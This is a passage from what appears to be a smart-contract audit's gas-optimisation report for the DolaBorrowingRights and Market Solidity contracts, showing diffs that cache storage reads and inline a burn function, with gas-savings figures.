+      341:+        require(balanceOf(msg.sender) >= amount, "Insufficient balance");

+      342:+        balances[msg.sender] -= amount;

+      343:+        unchecked {

+      344:+            _totalSupply -= amount;

+      345:+        }

+      346:+        emit Transfer(msg.sender, address(0), amount);

  342, 347:     }

  343, 348: 

  344, 349:     /**

@@ -364,20 +369,6 @@ contract DolaBorrowingRights {

  364, 369:         emit Transfer(address(0), to, amount);

  365, 370:     }

  366, 371: 

- 367     :-    /**

- 368     :-    @notice Internal function for burning DBR.

- 369     :-    @param from Address to burn DBR from.

- 370     :-    @param amount Amount of DBR to be burned.

- 371     :-    */

- 372     :-    function _burn(address from, uint256 amount) internal virtual {

- 373     :-        require(balanceOf(from) >= amount, "Insufficient balance");

- 374     :-        balances[from] -= amount;

- 375     :-        unchecked {

- 376     :-            _totalSupply -= amount;

- 377     :-        }

- 378     :-        emit Transfer(from, address(0), amount);

- 379     :-    }

- 380     :-

  381, 372:     event Transfer(address indexed from, address indexed to, uint256 amount);

  382, 373:     event Approval(address indexed owner, address indexed spender, uint256 amount);

  383, 374:     event AddMinter(address indexed minter);
[11] State variables should be cached in stack variables rather than re-reading them from storage (2 instances)
Deployment. Gas Saved: 5 007

Minimum Method Call. Gas Saved: 478

Average Method Call. Gas Saved: 1 117

Maximum Method Call. Gas Saved: 1 423

Overall gas change: -6 231 (-1.618%)

src/DBR.sol:286
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..c70fcd7 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -283,8 +283,9 @@ contract DolaBorrowingRights {

  283, 283:     */

  284, 284:     function accrueDueTokens(address user) public {

  285, 285:         uint debt = debts[user];

- 286     :-        if(lastUpdated[user] == block.timestamp) return;

- 287     :-        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

+      286:+        uint _lastUpdated = lastUpdated[user];

+      287:+        if(_lastUpdated == block.timestamp) return;

+      288:+        uint accrued = (block.timestamp - _lastUpdated) * debt / 365 days;

  288, 289:         dueTokensAccrued[user] += accrued;

  289, 290:         totalDueTokensAccrued += accrued;

  290, 291:         lastUpdated[user] = block.timestamp;
src/Market.sol:391
diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..5f3264d 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -388,8 +388,9 @@ contract Market {

  388, 388:     */

  389, 389:     function borrowInternal(address borrower, address to, uint amount) internal {

  390, 390:         require(!borrowPaused, "Borrowing is paused");

- 391     :-        if(borrowController != IBorrowController(address(0))) {

- 392     :-            require(borrowController.borrowAllowed(msg.sender, borrower, amount), "Denied by borrow controller");

+      391:+        IBorrowController _borrowController = borrowController;

+      392:+        if(_borrowController != IBorrowController(address(0))) {

+      393:+            require(_borrowController.borrowAllowed(msg.sender, borrower, amount), "Denied by borrow controller");

  393, 394:         }

  394, 395:         uint credit = getCreditLimitInternal(borrower);

  395, 396:         debts[borrower] += amount;
Overall gas savings
Deployment. Gas Saved: 416 802

Minimum Method Call. Gas Saved: 3 423

Average Method Call. Gas Saved: 15 773

Maximum Method Call. Gas Saved: 18 283

Overall gas change: -84 866 (-67.204%)

Please see warden’s original submission for full details and diff.